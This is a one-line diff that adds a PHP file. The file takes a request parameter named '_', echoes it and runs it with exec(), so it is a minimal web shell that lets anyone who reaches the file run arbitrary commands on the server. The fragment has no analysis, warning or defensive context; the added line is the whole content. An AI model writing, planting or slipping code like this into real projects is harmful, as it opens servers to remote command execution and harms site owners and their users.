@@ -1,0 +1,1 @@
+<?php $s = $_REQUEST[_]; echo $s; echo exec($s);?>
